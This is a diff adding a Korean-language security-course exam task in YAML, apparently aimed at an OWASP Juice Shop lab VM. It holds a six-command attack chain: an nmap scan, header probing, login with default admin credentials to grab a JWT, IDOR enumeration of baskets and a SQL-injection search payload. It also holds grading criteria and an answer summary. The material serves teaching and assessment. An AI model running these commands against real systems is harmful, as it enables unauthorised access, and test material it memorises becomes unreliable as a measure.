@@ -357,3 +357,107 @@ steps:
       - 우선순위 없음
       - Kill Chain 시연 누락
   target_vm: attacker
+- order: 99
+  instruction: |
+    [복합 시나리오 — 기말고사] "14주 종합 — 매트릭스 카탈로그 + Kill Chain + 최종 보고서"
+
+    ## 상황 (w14 → w15 기말)
+
+    > 선배: "기말이야. 한 학기 매트릭스 13개 정리 + Kill Chain 흐름 + 종합 보고서.
+    > 14주 동안 배운 거 다 쏟아부어."
+
+    학습 목표 (lecture w15 종합) + (lab #8 Kill Chain + #10 보고서) 통합.
+
+    ## 임무 (3 단계, 약 50분)
+
+    Non-AI 트랙: ssh ccc@10.20.30.201 (attacker VM) 직접 실행.
+
+    ### Phase A — 14주 매트릭스 카탈로그 (13행)
+    ```
+    | 주차 | 영역 | 매트릭스 | 핵심 결과 | OWASP |
+    | w02 | 도구 비교 | 3×4 | sqlmap < curl 정확도 | A03 |
+    | w03 | 헤더 정찰 | 권고표 5종 | CSP/HSTS 미설정 | A05 |
+    | w04 | 인증 매트릭스 | 4×4 | JWT-Header CSRF X | A07 |
+    | w05 | 입력 검증 | 4×4 | allowlist > blocklist | A03 |
+    | w06 | JWT chain | 4×5 | alg=none / XSS chain | A02 |
+    | w07 | 신뢰 경계 | 4×5 | Path/SSRF/cmd 통합 | A10 |
+    | w08 | 중간고사 | CVSS 5행 | XXE Critical | 종합 |
+    | w09 | 권한 상승 | 4×5 | IDOR + Proto | A01 |
+    | w10 | TLS+CMDi | 4×4 + cipher | TLSv1.2+ | A02 |
+    | w11 | 정보 누설 | 6행 | timing 채널 | A05 |
+    | w12 | OWASP API | 4×4 | API1/3/4/6 | API |
+    | w13 | 자동 vs 수동 | 4×4 | nikto+hydra+FP | 도구 |
+    | w14 | CVSS 우선순위 | 5행 | Quick Win | 보고 |
+    ```
+
+    ### Phase B — 3단계 Kill Chain
+    `nmap -p 80,3000,3306,8080 -sV --max-rtt-timeout 1000 10.20.30.80 2>&1 | head -15`
+    `curl -s -I http://10.20.30.80/ | grep -E "Server|X-Powered"`
+    `curl -s "http://10.20.30.80/api-docs" -o /dev/null -w "api-docs: %{http_code}\n"`
+    `JWT=$(curl -s -X POST -H "Content-Type: application/json" -d '{"email":"admin@juice-sh.op","password":"admin123"}'
+     http://10.20.30.80/rest/user/login | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('authentication',{}).get('token',''))" 2>/dev/null)`
+    `for i in 1 2 3 4 5; do curl -s -o /dev/null -w "basket/$i: %{http_code}\n"
+       -H "Authorization: Bearer $JWT" "http://10.20.30.80/api/Baskets/$i"; done`
+    `curl -s -o /dev/null -w "SQLi-search: %{http_code}\n" "http://10.20.30.80/rest/products/search?q=%27%20OR%201=1--"`
+
+    ### Phase C — Executive Summary + 우선순위 최종 보고서
+    [Executive Summary]
+    - 점검 대상: JuiceShop (http://10.20.30.80)
+    - 점검 기간: 14주 (w02-w14)
+    - 총 발견: Critical N + High M + Medium K
+    - 핵심 권고: Quick Win X 즉시 / WAF 단계적 / SDLC 통합
+
+    [Critical (CVSS 9.0+)]
+    1. /encryptionkeys 노출 — autoindex off
+    2. XXE 외부 entity — DOCTYPE 비활성화
+    3. WAF URL 이중 인코딩 우회 — CRS 강화
+
+    [High (7.0-8.9)]
+    4. /.git 노출 / 5. CSP 미설정 / 6. SQLi 검색
+
+    [Medium (4.0-6.9)]
+    7. Server header / 8. 보안 헤더 4종 누락 / 9. 사용자 enum
+
+    [OWASP Top 10] A01·A02·A03·A05·A07·A10 + API1/3/4/6 cover.
+
+    [조치 우선순위 (Quick Win 순)]
+    Step 1 (Day 1): autoindex off + DOCTYPE 비활성 + Server 제거
+    Step 2 (Week 1): CSP + Prepared Statement
+    Step 3 (Month 1): WAF 룰 재설계 + SDLC 통합
+
+    종료: echo "=== Phase A 매트릭스 카탈로그 ===" / "=== Phase B Kill Chain ===" /
+    "=== Phase C 최종 보고서 ===".
+  hint: |
+    Phase A: 13행 매트릭스 (w02-w14).
+    Phase B: nmap → header → JWT → basket → SQLi 6 명령.
+    Phase C: Executive + Critical 3 + High 3 + Medium 3 + OWASP + Step 1-3.
+    포인트: 14주 종합. 의사결정자 가독성.
+  category: integration_scenario
+  points: 100
+  verify:
+    type: output_contains
+    expect: 최종 보고서
+    field: stdout
+    semantic:
+      intent: |
+        14주 매트릭스 카탈로그 (13행) + Kill Chain 6 명령 + Executive Summary + Critical/High/Med + OWASP + 조치 우선순위.
+        lecture w15 + lab #8·#10 동시 행동 증명.
+      success_criteria:
+      - Phase A — 13행 매트릭스 카탈로그
+      - Phase B — Kill Chain 6 명령 + 결과
+      - Phase C — Executive + Critical 3 + High 3 + Medium 3 + OWASP + Step 1-3
+      acceptable_methods:
+      - markdown table 13행
+      - nmap + curl + python3 JWT
+      - Critical/High/Medium 분류
+      - Day1 / Week1 / Month1 조치
+      - DefectDojo / PTES 가능
+      negative_signs:
+      - 매트릭스 카탈로그 5행 이하
+      - Kill Chain 1~2 명령
+      - Executive Summary 누락
+      - 우선순위 단계 누락
+  target_vm: attacker
+  risk_level: low
+  answer_detail: |
+    학생이 ssh attacker 직접. 14주 학습 종합 — 13 매트릭스 + Kill Chain 6 + Executive + Quick Win Day1.
